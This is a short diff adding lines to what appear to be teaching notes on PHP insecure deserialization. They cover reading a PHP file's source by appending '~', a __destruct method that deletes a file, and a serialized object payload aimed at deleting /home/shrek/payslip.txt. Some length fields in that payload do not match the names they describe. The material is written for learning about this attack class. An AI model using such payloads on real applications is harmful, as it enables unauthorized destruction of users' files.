@@ -1,4 +1,13 @@
-
+Consider that we were able to retrieve the source of a php file by appending `~` in our request and extracted the below:
+```
+    function __destruct() {
+        if (file_exists($this->lock_file_path)) {
+            unlink($this->lock_file_path);
+```
+We could delete files by creating an object and sending in a valid parameter:
+```
+O:14:"Delete":1:{s:14:"lock_file_path";s:23:"/home/shrek/payslip.txt";}
+```
 
 Objects are serialized as:  
 `O:<i>:"<s>":<i>:{<properties>}`  
